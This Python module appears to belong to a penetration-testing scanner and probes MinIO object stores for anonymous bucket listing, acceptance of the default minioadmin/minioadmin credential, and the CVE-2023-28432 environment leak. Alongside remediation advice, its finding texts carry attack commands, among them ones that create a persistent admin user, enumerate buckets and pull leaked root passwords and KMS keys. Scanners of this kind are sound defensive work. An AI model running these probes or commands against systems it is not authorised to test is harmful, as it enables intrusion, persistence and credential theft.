"""MinIO (9000/tcp S3 API, 9001/tcp console) — S3-compatible object store.

MinIO is a very common self-hosted S3 clone. Two classes of exposure
dominate real environments:

  1. Default admin credentials (minioadmin/minioadmin) left in place on
     the S3 API listener — an operator-facing `mc alias set` + full
     bucket read/write follows immediately.
  2. Public read policy on the root / individual buckets — an
     unauthenticated `GET /` returns an S3 XML `ListAllMyBucketsResult`,
     enumerating every bucket on the tenant.

CVE-2023-28432 (info disclosure) also ships against the older builds
that were the norm through 2022–early 2023: an unauthenticated POST to
`/minio/bootstrap/v1/verify` returns the process env dict, exposing
`MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD`. We fingerprint-gate that
finding on the response actually returning the env keys — never blind-
guessed.

Findings emitted:
  * minio_reachable        (INFO,     t1) — `/minio/health/live` returned
    200 with a MinIO Server header (or `/` returned an XML doc with the
    S3 error grammar / bucket-list root). Fingerprint-gated.
  * minio_version          (INFO,     t0) — Server header contained a
    parseable MinIO release string; recorded for offline mapping.
  * minio_anonymous_root   (HIGH,     t2) — `GET /` returned 200 with an
    XML `<ListAllMyBucketsResult>` body — the tenant's bucket inventory
    is world-readable. From there `mc ls` / `aws s3 ls` walk buckets.
  * minio_default_creds_admin (CRITICAL, t1) — SAFE single-shot AWS4-
    signed `GET /` with minioadmin/minioadmin returned 200 and a bucket
    list. Full admin, per project safety rules NEVER loops through a
    cred list.
  * minio_cve_2023_28432   (CRITICAL, t1) — fingerprint-gated: POST
    `/minio/bootstrap/v1/verify` returned a JSON body containing the
    env dict with `MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD`. That IS
    the vulnerability — no version guessing.

Airgap-safe: stdlib http.client + ssl + hashlib + hmac only.
Bounded: at most 5 requests per target (health, root, signed root,
bootstrap POST, plus one TLS retry on the initial fetch). NEVER
attempts writes, NEVER attempts deletes, NEVER sprays.
"""
from __future__ import annotations

import datetime
import hashlib
import hmac
import http.client
import re
import ssl

from ..core.models import Host, Port


_DEFAULT_PORT = 9000
_TIMEOUT = 3.0
_UA = "recce-probe/1.0"

# Well-known MinIO defaults. Sent ONCE per target and only once. The
# CLI-side auth flow refuses to turn this into a spray by construction.
_DEFAULT_ADMIN_USER = "minioadmin"
_DEFAULT_ADMIN_SECRET = "minioadmin"

# Precomputed SHA-256 of the empty payload — GET has no body.
_EMPTY_SHA256 = hashlib.sha256(b"").hexdigest()

# CVE-2023-28432 fix: RELEASE.2023-03-20T20-16-18Z. Below-that dates
# are vulnerable. We only use this for the informational "vulnerable
# window" hint on the version finding — the CVE emission itself is
# fingerprint-gated by the endpoint actually returning env keys.
_CVE_2023_28432_FIX = (2023, 3, 20)


def is_minio(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid in (9000, 9001)
            or "minio" in svc or "minio" in prod)


def _http(ip: str, port: int, method: str, path: str,
          headers: dict | None = None, body: bytes = b"",
          timeout: float = _TIMEOUT):
    """One HTTP request. Transparently retries HTTPS if HTTP fails
    handshake. Returns (status, headers-dict, body-bytes) or None."""
    for use_tls in (False, True):
        conn = None
        try:
            if use_tls:
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(ip, port, timeout=timeout,
                                                   context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=timeout)
            hdrs = {"User-Agent": _UA, "Connection": "close"}
            if headers:
                hdrs.update(headers)
            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            b = resp.read(300_000)
            hd = {k.lower(): v for k, v in resp.getheaders()}
            return resp.status, hd, b
        except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
            if not use_tls:
                continue
            return None
        finally:
            if conn is not None:
                try: conn.close()
                except OSError: pass
    return None


# --- AWS4 signing (SigV4, minimal, GET / only) ---------------------------

def _sign(key: bytes, msg: str) -> bytes:
    return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()


def _aws4_sign_get_root(host_header: str,
                        access_key: str, secret_key: str,
                        region: str = "us-east-1") -> dict:
    """Build the AWS4 Authorization header set for a bare GET / against
    an S3-compatible endpoint. Returns the header dict to add to the
    request. This is the minimum viable SigV4 — GET, no query, empty
    payload — chosen so the default-cred probe is a single, deterministic
    signed request and nothing more."""
    now = datetime.datetime.now(datetime.timezone.utc)
    amz_date = now.strftime("%Y%m%dT%H%M%SZ")
    date_stamp = now.strftime("%Y%m%d")
    service = "s3"
    algorithm = "AWS4-HMAC-SHA256"
    credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"

    signed_headers = "host;x-amz-content-sha256;x-amz-date"
    canonical_headers = (f"host:{host_header}\n"
                         f"x-amz-content-sha256:{_EMPTY_SHA256}\n"
                         f"x-amz-date:{amz_date}\n")
    canonical_request = (f"GET\n/\n\n{canonical_headers}\n"
                         f"{signed_headers}\n{_EMPTY_SHA256}")
    string_to_sign = (f"{algorithm}\n{amz_date}\n{credential_scope}\n"
                      f"{hashlib.sha256(canonical_request.encode()).hexdigest()}")

    k_date = _sign(("AWS4" + secret_key).encode("utf-8"), date_stamp)
    k_region = _sign(k_date, region)
    k_service = _sign(k_region, service)
    k_signing = _sign(k_service, "aws4_request")
    signature = hmac.new(k_signing, string_to_sign.encode("utf-8"),
                         hashlib.sha256).hexdigest()

    authorization = (f"{algorithm} Credential={access_key}/{credential_scope}, "
                     f"SignedHeaders={signed_headers}, Signature={signature}")
    return {"Authorization": authorization,
            "x-amz-date": amz_date,
            "x-amz-content-sha256": _EMPTY_SHA256}


# --- probes -------------------------------------------------------------

_VERSION_RE = re.compile(r"RELEASE\.(\d{4})-(\d{2})-(\d{2})T"
                         r"(\d{2})-(\d{2})-(\d{2})Z")


def _extract_version(server_header: str) -> str:
    """Pull `RELEASE.YYYY-MM-DDTHH-MM-SSZ` from a Server header. MinIO
    normally sets it to bare 'MinIO' but some builds/deployments append
    the release date. Returns '' if none is found."""
    if not server_header:
        return ""
    m = _VERSION_RE.search(server_header)
    if m:
        return m.group(0)
    return ""


def _parse_release_date(rel: str) -> tuple[int, int, int] | None:
    m = _VERSION_RE.search(rel or "")
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _looks_minio_body(body: bytes) -> bool:
    """S3 XML grammar fingerprint. MinIO returns error XML with a MinIO-
    specific `<HostId>` prefix or the S3 `<ListAllMyBucketsResult>`
    root when GET / is public. A random web app on 9000 will not."""
    txt = body[:8_000].decode("utf-8", "replace").lower()
    if "<listallmybucketsresult" in txt:
        return True
    if "<error>" in txt and ("<code>" in txt and
                             ("accessdenied" in txt or "signaturedoesnotmatch"
                              in txt or "invalidaccesskeyid" in txt)):
        return True
    return False


def _looks_bucket_listing(body: bytes) -> bool:
    return b"<ListAllMyBucketsResult" in body[:8_000]


def _bucket_names(body: bytes) -> list[str]:
    """Extract <Name> entries from a ListAllMyBucketsResult body without
    pulling in an XML parser (stdlib xml would be fine but we already
    bounded the body to 8KB and this keeps the parser surface tiny)."""
    txt = body[:200_000].decode("utf-8", "replace")
    out: list[str] = []
    for m in re.finditer(r"<Name>([^<]{1,255})</Name>", txt):
        n = m.group(1).strip()
        # Skip the outer <Owner><ID>/<DisplayName> wrappers by requiring
        # a bucket-name character class.
        if n and re.match(r"^[a-z0-9][a-z0-9.\-]{1,62}$", n):
            out.append(n)
        if len(out) >= 25:
            break
    return out


def _probe_health(ip: str, port: int, timeout: float) -> dict:
    """GET /minio/health/live — canonical unauth liveness endpoint.
    Returns {"reachable": bool, "server": str, "version": str}."""
    out = {"reachable": False, "server": "", "version": ""}
    r = _http(ip, port, "GET", "/minio/health/live", timeout=timeout)
    if r is None:
        return out
    status, hdrs, _body = r
    server = hdrs.get("server", "")
    # /minio/health/live returns 200 with an empty body on a real MinIO.
    # A random 200 without a MinIO Server header is NOT flagged — the
    # header (or a body fingerprint on /) is the true tell.
    if status == 200 and "minio" in server.lower():
        out["reachable"] = True
        out["server"] = server[:120]
        out["version"] = _extract_version(server)
    return out


def _probe_root(ip: str, port: int, timeout: float) -> dict:
    """GET / — bucket listing (if public) OR the S3 XML error grammar
    (if not). Returns {"reachable": bool, "anonymous_listing": bool,
    "buckets": [str, ...], "bucket_count": int, "server": str,
    "version": str}."""
    out = {"reachable": False, "anonymous_listing": False,
           "buckets": [], "bucket_count": 0, "server": "", "version": ""}
    r = _http(ip, port, "GET", "/", timeout=timeout)
    if r is None:
        return out
    status, hdrs, body = r
    server = hdrs.get("server", "")
    if server:
        out["server"] = server[:120]
        out["version"] = _extract_version(server)
    if not _looks_minio_body(body) and "minio" not in server.lower():
        return out
    out["reachable"] = True
    if status == 200 and _looks_bucket_listing(body):
        out["anonymous_listing"] = True
        names = _bucket_names(body)
        out["buckets"] = names
        out["bucket_count"] = len(names)
    return out


def _probe_default_cred(ip: str, port: int, timeout: float) -> dict:
    """SAFE single-shot AWS4-signed GET / with minioadmin/minioadmin.
    NEVER loops through a credential list — one request, one hard-
    coded cred. Returns {"accepted": bool, "status": int,
    "bucket_count": int}."""
    out = {"accepted": False, "status": 0, "bucket_count": 0}
    host_hdr = f"{ip}:{port}"
    hdrs = _aws4_sign_get_root(host_hdr,
                               _DEFAULT_ADMIN_USER, _DEFAULT_ADMIN_SECRET)
    hdrs["Host"] = host_hdr
    r = _http(ip, port, "GET", "/", headers=hdrs, timeout=timeout)
    if r is None:
        return out
    status, _h, body = r
    out["status"] = status
    if status != 200:
        return out
    # 200 alone isn't proof — some proxies mask 401 as 200 with an
    # error body. Require the S3 bucket-listing shape.
    if _looks_bucket_listing(body):
        out["accepted"] = True
        out["bucket_count"] = len(_bucket_names(body))
    return out


def _probe_cve_2023_28432(ip: str, port: int, timeout: float) -> dict:
    """POST /minio/bootstrap/v1/verify — CVE-2023-28432 info-disclosure.
    Fingerprint-gated: only positive when the response body carries the
    MinIO env keys (MINIO_ROOT_USER / MINIO_ROOT_PASSWORD). No writes,
    no state change — the endpoint is a read-only cluster-bootstrap
    sync that pre-fix answered unauth. Returns {"vulnerable": bool,
    "root_user": str, "has_root_secret": bool, "status": int}."""
    out = {"vulnerable": False, "root_user": "", "has_root_secret": False,
           "status": 0}
    r = _http(ip, port, "POST", "/minio/bootstrap/v1/verify",
              headers={"Content-Type": "application/json",
                       "Content-Length": "0"},
              body=b"", timeout=timeout)
    if r is None:
        return out
    status, _h, body = r
    out["status"] = status
    if status != 200:
        return out
    # Fingerprint on the env-dict keys. Body form (per public advisory):
    # {"Env":{"MINIO_ROOT_USER":"minioadmin","MINIO_ROOT_PASSWORD":
    #  "minioadmin", ...}}
    txt = body[:200_000].decode("utf-8", "replace")
    if "MINIO_ROOT_USER" not in txt:
        return out
    out["vulnerable"] = True
    m = re.search(r'"MINIO_ROOT_USER"\s*:\s*"([^"]{1,128})"', txt)
    if m:
        out["root_user"] = m.group(1)[:128]
    if re.search(r'"MINIO_ROOT_PASSWORD"\s*:\s*"[^"]+"', txt):
        out["has_root_secret"] = True
    return out


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """Single-target MinIO probe. Returns
    {reachable, server, version, anonymous_listing, buckets, bucket_count,
     default_admin_creds, default_creds_status, default_creds_bucket_count,
     cve_2023_28432, cve_root_user, cve_has_root_secret}."""
    out: dict = {
        "reachable": False, "server": "", "version": "",
        "anonymous_listing": False, "buckets": [], "bucket_count": 0,
        "default_admin_creds": False, "default_creds_status": 0,
        "default_creds_bucket_count": 0,
        "cve_2023_28432": False, "cve_root_user": "",
        "cve_has_root_secret": False,
    }
    # Fingerprint via /minio/health/live first — the always-unauth
    # canonical endpoint. Fallback: XML grammar on GET /.
    health = _probe_health(ip, port, timeout)
    if health["reachable"]:
        out["reachable"] = True
        out["server"] = health["server"]
        out["version"] = health["version"]

    root = _probe_root(ip, port, timeout)
    if root["reachable"]:
        out["reachable"] = True
        if not out["server"] and root["server"]:
            out["server"] = root["server"]
        if not out["version"] and root["version"]:
            out["version"] = root["version"]
        if root["anonymous_listing"]:
            out["anonymous_listing"] = True
            out["buckets"] = root["buckets"]
            out["bucket_count"] = root["bucket_count"]

    if not out["reachable"]:
        return out

    # SAFE single-shot default-cred marker.
    dc = _probe_default_cred(ip, port, timeout)
    out["default_creds_status"] = dc["status"]
    if dc["accepted"]:
        out["default_admin_creds"] = True
        out["default_creds_bucket_count"] = dc["bucket_count"]

    # CVE-2023-28432: fingerprint-gated by the env-dict response.
    cve = _probe_cve_2023_28432(ip, port, timeout)
    if cve["vulnerable"]:
        out["cve_2023_28432"] = True
        out["cve_root_user"] = cve["root_user"]
        out["cve_has_root_secret"] = cve["has_root_secret"]

    return out


def minio_targets(hosts: list[Host]) -> list[dict]:
    """Module-scope (matches the _module_scoped_check qualname rule —
    NOT nested inside a class)."""
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_minio(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


_NARRATIVE = {
    "minio_reachable": (
        "MinIO answered the canonical fingerprint (Server header on "
        "/minio/health/live or an S3 XML grammar body on GET /). MinIO "
        "is a full S3-compatible object store — default admin cred is "
        "minioadmin/minioadmin, and a public read policy on / turns the "
        "entire tenant bucket list into an anonymous listing. Follow-on "
        "reads use standard S3 tools (mc, aws-cli)."),
    "minio_version": (
        "The build's release date was disclosed in the Server header "
        "(MinIO ships as `RELEASE.YYYY-MM-DDTHH-MM-SSZ`). Recorded for "
        "offline version-to-CVE mapping. Builds before "
        "RELEASE.2023-03-20T20-16-18Z carry CVE-2023-28432 — the CVE "
        "finding itself is gated on the endpoint actually leaking the "
        "env, so this row is informational."),
    "minio_anonymous_root": (
        "GET / returned a `<ListAllMyBucketsResult>` XML body without "
        "authentication — the tenant's full bucket inventory is world-"
        "readable. From there `mc alias set anon http://<ip>:9000` "
        "followed by `mc ls anon` (or `aws --endpoint-url` + "
        "`s3 ls`) walks buckets, and buckets with their own public read "
        "policy expose objects directly. Common blast radius on real "
        "engagements: DB backups, container image tarballs, CI/CD "
        "artefacts with hard-coded creds."),
    "minio_default_creds_admin": (
        "A single-shot AWS4-signed GET / with the minioadmin/minioadmin "
        "default credential returned 200 and an S3 bucket list — the "
        "console root account is unchanged. Recce NEVER sprays; this is "
        "one deterministic probe. From here `mc admin` gives full "
        "cluster admin: add users, change policies, create service "
        "accounts, mint pre-signed URLs for any object, or turn on "
        "site replication to exfiltrate the whole tenant."),
    "minio_cve_2023_28432": (
        "POST /minio/bootstrap/v1/verify returned a JSON body carrying "
        "the process env dict, including MINIO_ROOT_USER and "
        "MINIO_ROOT_PASSWORD. That IS the CVE-2023-28432 vulnerability "
        "— pre-fix builds answered the cluster-bootstrap sync endpoint "
        "unauthenticated. Any environment variable set on the MinIO "
        "process is leaked (root cred, KMS keys, S3 replica creds, "
        "notification queue creds). Fixed in "
        "RELEASE.2023-03-20T20-16-18Z."),
}


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "curl", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_minio(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("version") or ""

            # T1 headline: MinIO reachable.
            out.append(_finding(
                "info",
                "MinIO S3 object store reachable", tgt,
                f"MinIO {ver or '(version undisclosed)'} answered the "
                f"canonical fingerprint (/minio/health/live Server "
                f"header, or an S3 XML grammar body on GET /). Default "
                f"admin cred is minioadmin/minioadmin. Public bucket "
                f"read policies, root-cred left-in-place, and the "
                f"CVE-2023-28432 env leak all sit directly behind this "
                f"listener.",
                f"curl -sk http://{h.ip}:{p.portid}/minio/health/live -I",
                "Front the MinIO API and console with an authenticating "
                "proxy or gate them behind a private interface. Rotate "
                "the root credential (`MINIO_ROOT_USER` + "
                "`MINIO_ROOT_PASSWORD`) on first boot, audit bucket "
                "policies, and patch to a build past "
                "RELEASE.2023-03-20T20-16-18Z.",
                ["CWE-200"], kind="minio_reachable",
                exploit_note=(
                    "curl -sk http://<ip>:9000/minio/health/live -I; "
                    "curl -sk http://<ip>:9000/ | head"),
                depth_tier="t1"))

            # Version disclosure — INFO row. Elevated to HIGH if the
            # release date is inside the CVE-2023-28432 window (this is
            # informational — the CVE emission below is fingerprint-
            # gated on the actual env leak).
            if ver:
                rel = _parse_release_date(ver)
                old = rel is not None and rel < _CVE_2023_28432_FIX
                out.append(_finding(
                    "high" if old else "info",
                    "MinIO release string disclosed", tgt,
                    f"Server header carried '{ver}'. Recorded for "
                    f"offline version-to-CVE mapping."
                    + (" Release date sits BEFORE the CVE-2023-28432 "
                       "fix (RELEASE.2023-03-20T20-16-18Z) — verify "
                       "the env-leak endpoint below."
                       if old else ""),
                    f"curl -skI http://{h.ip}:{p.portid}/minio/health/live",
                    "Not directly fixable; upgrade past "
                    "RELEASE.2023-03-20T20-16-18Z and front with auth "
                    "so the endpoint is not reachable.",
                    [], kind="minio_version",
                    exploit_note=(
                        "curl -skI http://<ip>:9000/minio/health/live | "
                        "grep -i server"),
                    depth_tier="t0"))

            # Anonymous bucket listing on /.
            if pr.get("anonymous_listing"):
                buckets = pr.get("buckets") or []
                names_txt = ", ".join(buckets[:8]) or "(no names decoded)"
                more = "" if pr.get("bucket_count", 0) <= 8 else (
                    f" (+{pr['bucket_count'] - 8} more)")
                out.append(_finding(
                    "high",
                    "MinIO anonymous bucket listing (GET / world-"
                    "readable)", tgt,
                    f"GET / returned a `<ListAllMyBucketsResult>` XML "
                    f"body without authentication. "
                    f"{pr.get('bucket_count', 0)} bucket(s) enumerated: "
                    f"{names_txt}{more}. Any bucket that also carries "
                    f"a public read policy exposes its objects directly "
                    f"(DB backups, image tarballs, CI/CD artefacts).",
                    f"curl -sk http://{h.ip}:{p.portid}/",
                    "Set the tenant policy to require authenticated "
                    "listing (`mc admin policy set` or the console "
                    "Access Manager). Audit per-bucket policies for "
                    "any lingering `public` read grants. If the root "
                    "listing must stay open, front with a policy-"
                    "enforcing gateway.",
                    ["CWE-284", "CWE-200"],
                    kind="minio_anonymous_root",
                    exploit_note=(
                        "curl -sk http://<ip>:9000/ | grep -oE "
                        "'<Name>[^<]+</Name>'; for b in <buckets>; do "
                        "curl -sk \"http://<ip>:9000/$b/\" | head; done"),
                    depth_tier="t2"))

            # SAFE default-cred marker.
            if pr.get("default_admin_creds"):
                bc = pr.get("default_creds_bucket_count", 0)
                out.append(_finding(
                    "critical",
                    "MinIO default admin credential (minioadmin/"
                    "minioadmin) accepted", tgt,
                    f"A single-shot AWS4-signed GET / with the "
                    f"minioadmin/minioadmin default credential returned "
                    f"HTTP 200 with an S3 `<ListAllMyBucketsResult>` "
                    f"body ({bc} bucket(s) visible). Confirmed console "
                    f"admin. From here: `mc alias set pwn http://"
                    f"{h.ip}:{p.portid} minioadmin minioadmin && mc "
                    f"admin user add pwn <u> <p>` — persistent admin. "
                    f"Also enables per-object read/write, site "
                    f"replication (whole-tenant exfil), and mc admin "
                    f"trace (creds in cleartext for any authed "
                    f"caller).",
                    f"mc alias set pwn http://{h.ip}:{p.portid} "
                    f"minioadmin minioadmin && mc ls pwn",
                    "Rotate the root credential IMMEDIATELY: set "
                    "`MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD` in the "
                    "process environment (compose/env file / systemd "
                    "unit) and restart the service. Consider disabling "
                    "the root user entirely once operator IAM accounts "
                    "exist (`MINIO_BROWSER=off` + operator mc account).",
                    ["CWE-798", "CWE-521", "CWE-287"],
                    kind="minio_default_creds_admin",
                    exploit_note=(
                        "mc alias set pwn http://<ip>:9000 minioadmin "
                        "minioadmin; mc ls pwn; mc admin info pwn; "
                        "mc admin user add pwn attacker P@ssw0rd1"),
                    depth_tier="t1"))

            # CVE-2023-28432 — fingerprint-gated env leak.
            if pr.get("cve_2023_28432"):
                ru = pr.get("cve_root_user") or "?"
                sec = "MINIO_ROOT_PASSWORD leaked" if pr.get(
                    "cve_has_root_secret") else "MINIO_ROOT_PASSWORD not seen"
                out.append(_finding(
                    "critical",
                    "MinIO CVE-2023-28432: unauthenticated env leak "
                    "(bootstrap/v1/verify)", tgt,
                    f"POST /minio/bootstrap/v1/verify returned 200 "
                    f"with a JSON body containing the process env "
                    f"dict — MINIO_ROOT_USER='{ru}', {sec}. Any env "
                    f"variable set on the MinIO process is exposed "
                    f"(root cred, KMS keys, notification queue creds, "
                    f"replica S3 creds). Fixed in "
                    f"RELEASE.2023-03-20T20-16-18Z.",
                    f"curl -sk -X POST http://{h.ip}:{p.portid}"
                    "/minio/bootstrap/v1/verify",
                    "Upgrade to MinIO RELEASE.2023-03-20T20-16-18Z or "
                    "newer. Assume MINIO_ROOT_PASSWORD (and every "
                    "other env variable on the process) was captured — "
                    "rotate the root cred, KMS master keys, and any "
                    "replication / notification queue creds set in the "
                    "environment.",
                    ["CWE-306", "CWE-200", "CWE-522"],
                    kind="minio_cve_2023_28432",
                    exploit_note=(
                        "curl -sk -X POST http://<ip>:9000/minio/"
                        "bootstrap/v1/verify | python -m json.tool | "
                        "grep -E 'MINIO_ROOT_USER|MINIO_ROOT_PASSWORD|"
                        "MINIO_KMS|MINIO_NOTIFY'"),
                    depth_tier="t1"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Liveness / Server-header fingerprint",
         "cmd": f"curl -skI http://{ip}:{port}/minio/health/live"},
        {"step": "Bucket listing (public read on /)",
         "cmd": f"curl -sk http://{ip}:{port}/"},
        {"step": "SAFE default-cred marker (single-shot, DO NOT loop)",
         "cmd": (f"mc alias set probe http://{ip}:{port} "
                 "minioadmin minioadmin && mc ls probe")},
        {"step": "CVE-2023-28432 env leak (fingerprint-gated)",
         "cmd": (f"curl -sk -X POST http://{ip}:{port}"
                 "/minio/bootstrap/v1/verify")},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "minio", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = minio_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", "")
                t["anonymous_listing"] = pr.get("anonymous_listing", False)
                t["bucket_count"] = pr.get("bucket_count", 0)
                t["default_admin_creds"] = pr.get("default_admin_creds", False)
                t["cve_2023_28432"] = pr.get("cve_2023_28432", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
